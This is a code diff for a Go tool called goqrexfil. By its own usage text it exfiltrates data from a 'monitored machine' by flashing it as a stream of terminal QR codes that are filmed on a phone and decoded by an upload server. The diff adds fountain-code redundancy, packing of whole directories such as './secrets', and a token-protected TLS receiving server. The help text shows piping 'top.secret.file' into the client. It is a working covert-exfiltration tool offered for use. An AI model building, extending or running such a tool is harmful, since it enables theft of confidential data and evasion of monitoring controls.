@@ -1,47 +1,36 @@
 package main
 
 import (
-	"bytes"
-	"encoding/base64"
-	"encoding/hex"
+	"crypto/tls"
 	"flag"
 	"fmt"
 	"image"
-	"image/draw"
-	"image/png"
-	"io"
 	"net/http"
-	"net/url"
 	"os"
 	"os/exec"
 	"path/filepath"
-	"strconv"
-	"strings"
 	"time"
 
-	"github.com/boombuler/barcode"
-	"github.com/boombuler/barcode/qr"
 	"github.com/gin-gonic/gin"
-	"github.com/kjk/smaz"
-	goqr "github.com/liyue201/goqr"
 	log "github.com/sirupsen/logrus"
-	"github.com/zserge/lorca"
 	"golang.org/x/crypto/blake2b"
 )
 
 const (
 	serverPort        = "9999"                    // TCP port to run the web service on
-	videoLocation     = "./public/video.mp4"      // location of video uploaded to the web service
-	ffmpegQuality     = "16"                      // Quality for frames to images conversion. 1-31. 5 for great, 10 for acceptable (this helps reduce file size)
+	ffmpegQuality     = "16"                      // Quality for frames to images conversion. 1-31. 5 for great, 10 for acceptable
 	ffmpegImageScale  = "scale='min(iw,1600)':-1" // Cap very large (4K) frames at 1600px wide; never downscale normal frames, since shrinking the QR below ~600px breaks recognition
-	QRCDataMaxBytes   = 320                       // 230 was safe. If this gets too big, QR code will be hard to read...
-	secsBeforeDisplay = 3                         // 3 seconds before starting to display QR codes
-	msBetweenFrames   = 550                       // milliseconds between QR codes displayed to allow proper recording
-	retrieved         = "./payload/payload.bin"   // path to output payload file when video and all qr code data is retrieved
+	secsBeforeDisplay = 3                         // seconds before starting to display QR codes
+	msBetweenFrames   = 550                       // milliseconds each QR is held, to allow proper recording
+	maxUploadSize     = 512 << 20                 // 512 MB upload cap
+	defaultRedundancy = 50                        // default RaptorQ redundancy, in percent of k
+)
 
-	chunkPrefix   = "GQ1:"    // prefix identifying a framed chunk: GQ1:<seq>:<data>
-	chunkSeqWidth = 6         // zero-padded width of the sequence number
-	maxUploadSize = 512 << 20 // 512 MB upload cap
+// Output locations are variables (not consts) so tests can redirect them to temp dirs.
+var (
+	videoLocation = "./public/video.mp4"    // location of video uploaded to the web service
+	retrieved     = "./payload/payload.bin" // path to output payload file
+	extractedDir  = "./payload/extracted"   // where directory payloads are unpacked
 )
 
 // ffmpegPath resolves the ffmpeg binary, preferring PATH and falling back to
@@ -63,149 +52,32 @@ func ffmpegPath() string {
 	return "ffmpeg"
 }
 
-// encodeQR renders chunk as a PNG QR code image.
-func encodeQR(chunk string) []byte {
-	qrCode, err := qr.Encode(chunk, qr.H, qr.Unicode)
-	if err != nil {
-		log.Fatal(err)
-	}
-	qrCode, err = barcode.Scale(qrCode, 600, 600)
-	if err != nil {
-		log.Fatal(err)
-	}
-	var buff bytes.Buffer
-	if err := png.Encode(&buff, qrCode); err != nil {
-		log.Fatal(err)
-	}
-	return buff.Bytes()
-}
-
-// RenderQR returns a QR code HTML image with encoded chunk as data
-func RenderQR(chunk string) string {
-	encodedString := base64.StdEncoding.EncodeToString(encodeQR(chunk))
-	return "<img src=\"data:image/png;base64," + encodedString + "\" />"
-}
-
-// payloadInChunks cuts a string payload into chunks of at most chunkSize bytes.
-func payloadInChunks(longString string, chunkSize int) []string {
-	if chunkSize <= 0 {
-		log.Fatalf("chunkSize must be positive, got %d", chunkSize)
-	}
-	var slices []string
-	for i := 0; i < len(longString); i += chunkSize {
-		end := i + chunkSize
-		if end > len(longString) {
-			end = len(longString)
-		}
-		slices = append(slices, longString[i:end])
-	}
-	return slices
-}
-
-// formatChunk wraps a payload chunk with a sequence number so the server can
-// reassemble out-of-order frames and detect missing chunks.
-func formatChunk(seq int, data string) string {
-	return fmt.Sprintf("%s%0*d:%s", chunkPrefix, chunkSeqWidth, seq, data)
-}
-
-// parseChunk is the inverse of formatChunk.
-func parseChunk(s string) (seq int, data string, ok bool) {
-	if !strings.HasPrefix(s, chunkPrefix) {
-		return 0, "", false
-	}
-	rest := s[len(chunkPrefix):]
-	i := strings.IndexByte(rest, ':')
-	if i <= 0 {
-		return 0, "", false
-	}
-	seq, err := strconv.Atoi(rest[:i])
-	if err != nil || seq < 0 {
-		return 0, "", false
-	}
-	return seq, rest[i+1:], true
-}
-
-// formatMissing renders 0-based missing seqs as the 1-based comma separated
-// list the client --resume flag expects.
-func formatMissing(missing []int) string {
-	parts := make([]string, len(missing))
-	for i, m := range missing {
-		parts[i] = strconv.Itoa(m + 1)
-	}
-	return strings.Join(parts, ",")
-}
-
-// DecodeQRCode returns the payload string found in img, or "" if none.
-func DecodeQRCode(img image.Image) string {
-	b := img.Bounds()
-	rgba := image.NewRGBA(b)
-	draw.Draw(rgba, b, img, b.Min, draw.Src)
-	qrCodes, err := goqr.Recognize(rgba)
-	if err != nil {
-		return ""
-	}
-	var payload string
-	for _, qrCode := range qrCodes {
-		payload = payload + string(qrCode.Payload)
-	}
-	return payload
-}
-
 type retrievalResult struct {
 	complete bool
 	received int
-	total    int
-	missing  []int
+	base     int // estimated k (base symbols needed)
 	payload  []byte
+	files    int    // if a directory payload, number of files extracted
+	dest     string // where the payload/files were written
 }
 
-// reassembles the payload from the framed chunks collected from the video.
-func reassemble(chunks map[int]string) *retrievalResult {
-	total := 0
-	for seq := range chunks {
-		if seq >= total {
-			total = seq + 1
-		}
+// savePayload writes the reassembled payload, unpacking directory payloads and
+// verifying their manifest. Returns the destination path.
+func savePayload(payload []byte) (int, string, error) {
+	if isTarGZ(payload) {
+		dest := extractedDir
+		n, err := extractDirectoryPayload(payload, dest)
+		return n, dest, err
 	}
-	var missing []int
-	for seq := 0; seq < total; seq++ {
-		if _, ok := chunks[seq]; !ok {
-			missing = append(missing, seq)
-		}
+	if err := writePayloadFile(payload, retrieved); err != nil {
+		return 0, "", err
 	}
-	fmt.Printf("[*] Received %d/%d chunks", len(chunks), total)
-	if len(missing) > 0 {
-		fmt.Println(" - MISSING:", formatMissing(missing))
-		return &retrievalResult{received: len(chunks), total: total, missing: missing}
-	}
-	fmt.Println()
-
-	var buf strings.Builder
-	for seq := 0; seq < total; seq++ {
-		buf.WriteString(chunks[seq])
-	}
-	decoded, err := base64.StdEncoding.DecodeString(buf.String())
-	if err != nil {
-		log.Fatalf("base64 decode failed: %v", err)
-	}
-	decompressed, err := smaz.Decode(nil, decoded)
-	if err != nil {
-		log.Fatalf("smaz decode failed: %v", err)
-	}
-	writePayloadFile(decompressed, retrieved)
-	h := blake2b.Sum256(decompressed) // content
-	fmt.Println("[*] Payload saved as ", retrieved, "\nPayload hash", hex.EncodeToString(h[:]))
-	return &retrievalResult{complete: true, received: total, total: total, payload: decompressed}
+	return 0, retrieved, nil
 }
 
-/*
-	retrievePayload is the main function that will take the uploaded video,
-
-will extract frames and will call DecodeQRCode() to get the payload.
-it will also concatenate all pieces and finally return the full payload.
-*/
+// retrievePayload extracts frames from the uploaded video, feeds the QR symbols
+// to a RaptorQ decoder, and stops as soon as the payload is reconstructable.
 func retrievePayload() *retrievalResult {
-	// Split video into frames using ffmpeg. Ideally it should be a module and not an exec.command call
 	files, err := filepath.Glob("./public/*png")
 	if err != nil {
 		log.Fatal(err)
@@ -228,10 +100,10 @@ func retrievePayload() *retrievalResult {
 		log.Fatal(err)
 	}
 
-	// Now we need to parse all frames, find if a QR Code is present and extract data from it
-	chunks := make(map[int]string)
+	dec := &decoder{}
 	matches, _ := filepath.Glob("./public/*png")
-	fmt.Println("[***] Extracting data from", len(matches), "frames, skipping duplicates")
+	fmt.Println("[***] Extracting symbols from", len(matches), "frames")
+	lastReport := 0
 	for _, match := range matches {
 		f, err := os.Open(match)
 		if err != nil {
@@ -246,75 +118,162 @@ func retrievePayload() *retrievalResult {
 		if raw == "" {
 			continue
 		}
-		seq, data, ok := parseChunk(raw)
+		cl, id, sym, ok := parseSymbol(raw)
 		if !ok {
-			fmt.Println("[!] Skipping QR code in", match, "with unrecognized format")
+			fmt.Println("[!] Skipping frame", match, "with unrecognized format")
 			continue
 		}
-		if _, exists := chunks[seq]; !exists {
-			chunks[seq] = data
-			fmt.Println("[*] Retrieving chunk", seq+1, "from", match)
+		done, err := dec.add(id, sym, cl)
+		if err != nil {
+			log.Errorf("decoder: %v", err)
+			continue
+		}
+		if r := dec.receivedCount(); r > lastReport+24 {
+			lastReport = r
+			fmt.Printf("[*] received %d symbols (need ~%d)\n", r, dec.baseSymbols())
+		}
+		if done {
+			payload, err := dec.finish()
+			if err != nil {
+				log.Fatalf("reconstruct: %v", err)
+			}
+			n, dest, err := savePayload(payload)
+			if err != nil {
+				log.Fatalf("save payload: %v", err)
+			}
+			h := blake2b.Sum256(payload)
+			fmt.Printf("[*] Payload reconstructed from %d symbols (need ~%d)\n", dec.receivedCount(), dec.baseSymbols())
+			if n > 0 {
+				fmt.Println("[*] Directory payload:", n, "files extracted to", dest)
+			} else {
+				fmt.Println("[*] Payload saved as", dest)
+			}
+			fmt.Println("Payload hash", fmtHash(h[:]))
+			return &retrievalResult{complete: true, received: dec.receivedCount(), base: dec.baseSymbols(), payload: payload, files: n, dest: dest}
 		}
 	}
 
-	if len(chunks) == 0 {
-		log.Info("!!! No Payload retrieved from analyzed frames")
-		return &retrievalResult{}
+	// Video exhausted without a solvable subset.
+	res := &retrievalResult{received: dec.receivedCount(), base: dec.baseSymbols()}
+	if dec.ready() {
+		if payload, err := dec.finish(); err == nil {
+			n, dest, _ := savePayload(payload)
+			res.complete, res.payload, res.files, res.dest = true, payload, n, dest
+			return res
+		}
 	}
-	return reassemble(chunks)
+	log.Info("!!! Not enough symbols recovered from analyzed frames - re-record the video")
+	return res
 }
 
-var lastResult *retrievalResult
+func fmtHash(b []byte) string {
+	const hexdigits = "0123456789abcdef"
+	out := make([]byte, 0, len(b)*2)
+	for _, v := range b {
+		out = append(out, hexdigits[v>>4], hexdigits[v&0xF])
+	}
+	return string(out)
+}
 
-func webService() {
+func writePayloadFile(payload []byte, filename string) error {
+	if err := os.MkdirAll(filepath.Dir(filename), 0755); err != nil {
+		return err
+	}
+	_ = os.Remove(filename)
+	file, err := os.OpenFile(filename, os.O_WRONLY|os.O_TRUNC|os.O_CREATE, 0600)
+	if err != nil {
+		return err
+	}
+	if _, err := file.Write(payload); err != nil {
+		file.Close()
+		return err
+	}
+	return file.Close()
+}
+
+// tokenMiddleware, when token is non-empty, requires the token (query param or
+// form field) on the request.
+func tokenMiddleware(token string) gin.HandlerFunc {
+	return func(c *gin.Context) {
+		if token == "" {
+			c.Next()
+			return
+		}
+		provided := c.Query("token")
+		if provided == "" {
+			provided = c.PostForm("token")
+		}
+		if provided != token {
+			c.String(http.StatusUnauthorized, "missing or invalid token")
+			c.Abort()
+			return
+		}
+		c.Next()
+	}
+}
+
+// uploadForm renders the upload page, embedding the token as a hidden field.
+func uploadForm(token string) string {
+	tokenField := ""
+	if token != "" {
+		tokenField = fmt.Sprintf("<input type=\"hidden\" name=\"token\" value=\"%s\">", token)
+	}
+	return `<html lang="en-us"><body>
+<h2>goqrexfil</h2>
+<p>Upload the video you recorded of the QR stream.</p>
+<form action="/upload" enctype="multipart/form-data" method="POST">
+` + tokenField + `    <input accept="*" name="file" type="file"/>
+    <button type="submit">submit</button>
+</form>
+</body></html>`
+}
+
+func webService(token string, tlsEnabled bool, certFile, keyFile string) {
 	gin.SetMode("release")
 	router := gin.New()
 	router.MaxMultipartMemory = maxUploadSize
-	router.Static("/process", "./public")
+	router.Use(tokenMiddleware(token))
+
+	router.GET("/", func(c *gin.Context) {
+		c.String(http.StatusOK, uploadForm(token))
+	})
 	router.GET("/payload", func(c *gin.Context) {
 		if _, err := os.Stat(retrieved); err != nil {
 			c.String(http.StatusNotFound, "no payload available yet")
 			return
 		}
-		// These headers are needed by some browsers (without them Chrome downloads files as txt)
 		c.Header("Content-Disposition", "attachment; filename="+filepath.Base(retrieved))
 		c.Header("Content-Type", "application/octet-stream")
 		c.File(retrieved)
 	})
-	// /missing lists the 1-based chunk numbers to re-record, formatted for --resume
+	// /missing lists how many more symbols are needed (fountain codes: any more
+	// of the stream helps, so this is advisory).
 	router.GET("/missing", func(c *gin.Context) {
-		if lastResult == nil || len(lastResult.missing) == 0 {
-			c.String(http.StatusNotFound, "no missing chunks")
-			return
-		}
-		c.String(http.StatusOK, formatMissing(lastResult.missing))
+		c.String(http.StatusOK, "fountain-coded: re-record the stream; any additional symbols help")
 	})
-	// upload will get a file and save it in ./public
-	// test: curl -F 'file=@./1.jpg' http://localhost:9999/upload
 	router.POST("/upload", func(c *gin.Context) {
 		file, err := c.FormFile("file")
 		if err != nil {
 			c.String(http.StatusBadRequest, fmt.Sprintf("get form err: %s", err.Error()))
 			return
 		}
-
 		if err := c.SaveUploadedFile(file, videoLocation); err != nil {
 			c.String(http.StatusBadRequest, fmt.Sprintf("upload file err: %s", err.Error()))
 			return
 		}
 		log.Println("\n[*] File received")
 
-		// processing
 		result := retrievePayload()
-		lastResult = result
 		var myLink string
 		switch {
 		case result.complete:
-			myLink = "<b>Payload retrieved.</b> <a href='/payload'>download payload</a>"
+			if result.files > 0 {
+				myLink = fmt.Sprintf("<b>Directory payload: %d files</b> extracted to <code>%s</code>.", result.files, result.dest)
+			} else {
+				myLink = "<b>Payload retrieved.</b> <a href='/payload'>download payload</a>"
+			}
 		case result.received > 0:
-			missing := formatMissing(result.missing)
-			myLink = fmt.Sprintf("<b>Partial payload: %d/%d chunks.</b> Missing: <code>%s</code><br/>Re-record those chunks with <code>--client --resume %s</code> and upload again.",
-				result.received, result.total, missing, missing)
+			myLink = fmt.Sprintf("<b>Partial: %d symbols received (need ~%d).</b> Not enough to decode yet - re-record the video (any additional symbols help).", result.received, result.base)
 		default:
 			myLink = "<b>No payload retrieved.</b>"
 		}
@@ -322,48 +281,112 @@ func webService() {
 			log.Fatal("Cannot write response")
 		}
 	})
-	log.Info("Serving on port ", serverPort)
-	router.Run(":" + serverPort)
-}
+	router.Static("/process", "./public")
 
-func writePayloadFile(payload []byte, filename string) {
-	err := os.Remove(filename)
-	if err != nil {
-		fmt.Println("\n[I] No previous payload file found")
-	} else {
-		fmt.Println("\n[I] Deleted previous payload file")
-	}
-	// Open a new file for writing only
-	file, err := os.OpenFile(
-		filename,
-		os.O_WRONLY|os.O_TRUNC|os.O_CREATE,
-		0600,
-	)
-	if err != nil {
-		log.Fatal(err)
-	}
-	defer func(file *os.File) {
-		err := file.Close()
+	srv := &http.Server{Addr: ":" + serverPort, Handler: router}
+	if tlsEnabled {
+		cert, fp, err := loadOrGenerateTLS(certFile, keyFile)
 		if err != nil {
 			log.Fatal(err)
 		}
-	}(file)
-
-	// Write bytes to file
-	_, err = file.Write(payload)
-	if err != nil {
+		if certFile == "" || keyFile == "" {
+			fmt.Println("[*] Using self-signed certificate, SHA-256 fingerprint:")
+			fmt.Println("   ", fp)
+		}
+		srv.TLSConfig = &tls.Config{Certificates: []tls.Certificate{cert}}
+		log.Info("Serving TLS on port ", serverPort)
+		if err := srv.ListenAndServeTLS("", ""); err != nil {
+			log.Fatal(err)
+		}
+		return
+	}
+	log.Info("Serving on port ", serverPort)
+	if err := srv.ListenAndServe(); err != nil {
 		log.Fatal(err)
 	}
 }
 
-// selfTest encodes the payload into QR PNGs on disk, decodes them back and
-// verifies the reassembled payload matches the original. No camera needed.
+// clientMode reads the payload, encodes it as a RaptorQ symbol stream, and
+// displays each symbol as a terminal QR code for video recording.
+func clientMode(path string, redundancy int, dryRun, noQuiet bool) {
+	fmt.Println("[***] Client mode: ON")
+	data, name, err := resolvePayloadSource(path)
+	if err != nil {
+		log.Fatalf("failed to read payload: %s", err)
+	}
+	if len(data) == 0 {
+		log.Fatalf("No data read from source %q", name)
+	}
+	h := blake2b.Sum256(data)
+	fmt.Println("[*] Source:", name, "("+humanSize(int64(len(data)))+")")
+	fmt.Println("Plaintext hash", fmtHash(h[:]))
+
+	framed, k, err := encodePayload(data, redundancy)
+	if err != nil {
+		log.Fatalf("encode: %v", err)
+	}
+	m := len(framed)
+	secs := float64(m) * msBetweenFrames / 1000
+	fmt.Printf("\n[*] %d base symbols, %d total (redundancy %d%%)\n", k, m, redundancy)
+	fmt.Printf("[*] Estimated recording time: ~%.0fs\n", secs)
+
+	if dryRun {
+		fmt.Println("[*] Dry run: nothing displayed.")
+		return
+	}
+
+	// Warn if the QR is wider than the terminal.
+	qz := 4
+	if noQuiet {
+		qz = 0
+	}
+	if w, err := qrTerminalWidth(framed[0], qz); err == nil {
+		if cols := termCols(); cols > 0 && w > cols {
+			fmt.Printf("[!] QR is ~%d columns wide but terminal is %d. Widen the terminal%s.\n",
+				w, cols, hintNoQuiet(noQuiet))
+		}
+	}
+
+	fmt.Println("[***] Point your phone at this terminal, start recording, then in >", secsBeforeDisplay, "< seconds ****")
+	time.Sleep(secsBeforeDisplay * time.Second)
+
+	for i, f := range framed {
+		time.Sleep(msBetweenFrames * time.Millisecond)
+		caption := fmt.Sprintf("goqrexfil  symbol %d / %d", i+1, m)
+		if err := displayQRTerminal(f, caption, qz); err != nil {
+			log.Fatalf("display: %v", err)
+		}
+	}
+	time.Sleep(msBetweenFrames * time.Millisecond)
+	fmt.Printf("\x1b[2J\x1b[HDone - stop recording. You sent %d symbols.\n", m)
+}
+
+func hintNoQuiet(noQuiet bool) string {
+	if noQuiet {
+		return ""
+	}
+	return " (or re-run with --no-quiet-zone to save 8 columns)"
+}
+
+// termCols best-effort terminal width from $COLUMNS (0 if unknown).
+func termCols() int {
+	if c := os.Getenv("COLUMNS"); c != "" {
+		var n int
+		if _, err := fmt.Sscanf(c, "%d", &n); err == nil {
+			return n
+		}
+	}
+	return 0
+}
+
 func selfTest(data []byte) {
 	fmt.Println("[***] Self-test mode: local QR round-trip, no camera needed")
-	compressed := smaz.Encode(nil, data)
-	encoded := base64.StdEncoding.EncodeToString(compressed)
-	chunks := payloadInChunks(encoded, QRCDataMaxBytes)
-	fmt.Println("[*] Payload will be in", len(chunks), "chunks")
+	framed, k, err := encodePayload(data, defaultRedundancy)
+	if err != nil {
+		log.Fatalf("encode: %v", err)
+	}
+	m := len(framed)
+	fmt.Printf("[*] %d base symbols, %d total\n", k, m)
 
 	dir, err := os.MkdirTemp("", "goqrexfil-selftest-")
 	if err != nil {
@@ -371,15 +394,21 @@ func selfTest(data []byte) {
 	}
 	defer os.RemoveAll(dir)
 
-	for i, chunk := range chunks {
-		pngBytes := encodeQR(formatChunk(i, chunk))
-		if err := os.WriteFile(filepath.Join(dir, fmt.Sprintf("%03d.png", i)), pngBytes, 0644); err != nil {
+	dec := &decoder{}
+	// Simulate a lossy capture: keep only 80% of the symbols.
+	kept := 0
+	for i, f := range framed {
+		if i%5 == 4 {
+			continue // dropped frame
+		}
+		kept++
+		pngBytes := encodeQR(f)
+		if err := os.WriteFile(filepath.Join(dir, fmt.Sprintf("%04d.png", i)), pngBytes, 0644); err != nil {
 			log.Fatal(err)
 		}
 	}
-	fmt.Println("[*] Wrote", len(chunks), "QR PNGs to", dir)
+	fmt.Println("[*] Wrote", kept, "of", m, "QR PNGs (simulating 80% capture) to", dir)
 
-	chunkMap := make(map[int]string)
 	matches, _ := filepath.Glob(filepath.Join(dir, "*.png"))
 	for _, match := range matches {
 		f, err := os.Open(match)
@@ -391,58 +420,24 @@ func selfTest(data []byte) {
 		if err != nil {
 			log.Fatal(err)
 		}
-		seq, data, ok := parseChunk(DecodeQRCode(img))
+		cl, id, sym, ok := parseSymbol(DecodeQRCode(img))
 		if !ok {
 			log.Fatalf("FAIL: could not decode QR in %s", match)
 		}
-		chunkMap[seq] = data
+		if _, err := dec.add(id, sym, cl); err != nil {
+			log.Fatalf("FAIL: decoder error: %v", err)
+		}
 	}
 
-	total := len(chunks)
-	if len(chunkMap) != total {
-		log.Fatalf("FAIL: decoded %d/%d chunks", len(chunkMap), total)
-	}
-	var buf strings.Builder
-	for seq := 0; seq < total; seq++ {
-		buf.WriteString(chunkMap[seq])
-	}
-	decoded, err := base64.StdEncoding.DecodeString(buf.String())
+	out, err := dec.finish()
 	if err != nil {
-		log.Fatalf("FAIL: base64 decode: %v", err)
+		log.Fatalf("FAIL: %v", err)
 	}
-	out, err := smaz.Decode(nil, decoded)
-	if err != nil {
-		log.Fatalf("FAIL: smaz decode: %v", err)
-	}
-	if !bytes.Equal(out, data) {
+	if string(out) != string(data) {
 		log.Fatalf("FAIL: payload mismatch (got %d bytes, want %d)", len(out), len(data))
 	}
-	h := blake2b.Sum256(out)
-	fmt.Println("[*] PASS: round-trip OK, payload hash", hex.EncodeToString(h[:]))
-}
-
-// parseResume parses a comma separated list of 1-based chunk numbers into a
-// set of 0-based seqs. Returns nil if s is empty.
-func parseResume(s string, total int) (map[int]bool, error) {
-	if s == "" {
-		return nil, nil
-	}
-	set := make(map[int]bool)
-	for _, part := range strings.Split(s, ",") {
-		part = strings.TrimSpace(part)
-		if part == "" {
-			continue
-		}
-		n, err := strconv.Atoi(part)
-		if err != nil || n < 1 || n > total {
-			return nil, fmt.Errorf("invalid chunk number %q (must be 1-%d)", part, total)
-		}
-		set[n-1] = true
-	}
-	if len(set) == 0 {
-		return nil, fmt.Errorf("no valid chunk numbers in %q", s)
-	}
-	return set, nil
+	hh := blake2b.Sum256(out)
+	fmt.Println("[*] PASS: round-trip OK from 80% of symbols, payload hash", fmtHash(hh[:]))
 }
 
 func main() {
@@ -451,83 +446,51 @@ func main() {
 	isClient := flag.Bool("client", false, "Client mode")
 	isSelfTest := flag.Bool("selftest", false, "Self-test: encode and decode QRs locally, no camera needed")
 	isProcessing := flag.Bool("retrievePayload", false, "Processing existing video only (debug mode)")
-	isResume := flag.String("resume", "", "Client: only display these 1-based chunk numbers (comma separated), for re-recording missing chunks")
+	token := flag.String("token", "", "Server: require this shared token on upload/download")
+	tlsEnabled := flag.Bool("tls", false, "Server: serve over TLS (self-signed if no cert/key given)")
+	tlsCert := flag.String("tls-cert", "", "Server: TLS certificate file (with --tls)")
+	tlsKey := flag.String("tls-key", "", "Server: TLS key file (with --tls)")
+	redundancy := flag.Int("redundancy", defaultRedundancy, "Client: RaptorQ redundancy as % of base symbols")
+	dryRun := flag.Bool("dry-run", false, "Client: show symbol count and time estimate, display nothing")
+	noQuiet := flag.Bool("no-quiet-zone", false, "Client: omit the QR quiet zone to save 8 columns")
 	flag.Parse()
 
 	if *isSelfTest {
-		data, err := io.ReadAll(os.Stdin)
+		data, _, err := resolvePayloadSource(flag.Arg(0))
 		if err != nil {
-			log.Fatalf("failed to read stdin: %s", err)
+			log.Fatalf("failed to read payload: %s", err)
 		}
 		if len(data) == 0 {
-			log.Fatalf("No data read from stdin")
+			log.Fatalf("No data read from source")
 		}
 		selfTest(data)
 	} else if *isProcessing {
 		log.Println("Processing only - DEBUG MODE")
 		_ = retrievePayload()
 	} else if *isServer {
-		// webService mode (retrieving data from video)
 		fmt.Println("[*] Server mode: ON")
-		webService()
+		webService(*token, *tlsEnabled, *tlsCert, *tlsKey)
 	} else if *isClient {
-		// Client mode (allowing video recording of QR codes)
-		fmt.Println("[***] Client mode: ON")
-		fmt.Println("[*] Loading payload from stdin")
-		readText, err := io.ReadAll(os.Stdin)
-		if err != nil {
-			log.Fatalf("failed to read stdin: %s", err)
+		path := ""
+		if flag.NArg() > 0 {
+			path = flag.Arg(0)
 		}
-		if len(readText) == 0 {
-			log.Fatalf("No data read from stdin")
-		}
-		h := blake2b.Sum256(readText)
-		fmt.Println("Plaintext hash", hex.EncodeToString(h[:]))
-
-		// Compress, encode, payload in chunks then display the QrCodes
-		compressed := smaz.Encode(nil, readText)
-		encoded := base64.StdEncoding.EncodeToString(compressed)
-		chunks := payloadInChunks(encoded, QRCDataMaxBytes)
-		fmt.Println("\n[*] Payload will be in", len(chunks), "chunks")
-
-		resume, err := parseResume(*isResume, len(chunks))
-		if err != nil {
-			log.Fatal(err)
-		}
-		if resume != nil {
-			fmt.Println("[*] Resume mode: displaying", len(resume), "chunk(s):", *isResume)
-		}
-
-		fmt.Println("[***] Start your video, displaying in >", secsBeforeDisplay, "< seconds ****")
-		fmt.Println()
-		time.Sleep(secsBeforeDisplay * time.Second)
-
-		// Create UI with basic HTML passed via data URI
-		ui, err := lorca.New("data:text/html,"+url.PathEscape(`<html><body><h1>Starting...</h1></body></html>`), "", 675, 675)
-		if err != nil {
-			log.Fatal("lorca.New():", err)
-		}
-		defer ui.Close()
-
-		// Iterate on chunks, generate QR code and display it in UI
-		shown := 0
-		for i, chunk := range chunks {
-			if resume != nil && !resume[i] {
-				continue
-			}
-			time.Sleep(msBetweenFrames * time.Millisecond) // need some delays to allow video recording and avoid losing a frame
-			ui.Load("data:text/html," + url.PathEscape(`<html><body><center>`+RenderQR(formatChunk(i, chunk))+`</center></body></html>`))
-			shown++
-		}
-		time.Sleep(msBetweenFrames * time.Millisecond)
-		ui.Load("data:text/html," + url.PathEscape(fmt.Sprintf(`<html><body><h1>Done (%d chunks)</h1></body></html>`, shown)))
-		<-ui.Done()
+		clientMode(path, *redundancy, *dryRun, *noQuiet)
 	} else {
-		fmt.Println("Please use client or server mode:")
-		fmt.Println("echo \"data to send\" | ./goqrexfil --client\t\tTo use in client mode")
-		fmt.Println("echo \"data to send\" | ./goqrexfil --client --resume 3,7,12\tOnly display specific chunks (re-record missing ones)")
-		fmt.Println("echo \"data to send\" | ./goqrexfil --selftest\t\tLocal round-trip test, no camera needed")
-		fmt.Println("./goqrexfil --server\t\t\t\t\tTo use as a web server to receive video and retrieve payload.")
+		fmt.Println("goqrexfil - exfiltrate data as QR codes captured on video")
+		fmt.Println()
+		fmt.Println("Client (on the monitored machine):")
+		fmt.Println("  cat top.secret.file | ./goqrexfil --client           display QR stream on stdin")
+		fmt.Println("  ./goqrexfil --client ./secrets                        pack a directory and display")
+		fmt.Println("  ./goqrexfil --client --dry-run ./secrets              show size/time estimate only")
+		fmt.Println("  ./goqrexfil --client --redundancy 100 ./secrets       more redundancy (longer, more robust)")
+		fmt.Println("  cat file | ./goqrexfil --selftest                     local round-trip test, no camera")
+		fmt.Println()
+		fmt.Println("Server (on your machine):")
+		fmt.Println("  ./goqrexfil --server                                 web server on port 9999")
+		fmt.Println("  ./goqrexfil --server --token SECRET                  require a shared token")
+		fmt.Println("  ./goqrexfil --server --tls                           serve over TLS (self-signed)")
+		fmt.Println("  ./goqrexfil --retrievePayload                        re-process ./public/video.mp4")
 		fmt.Println()
 		os.Exit(1)
 	}
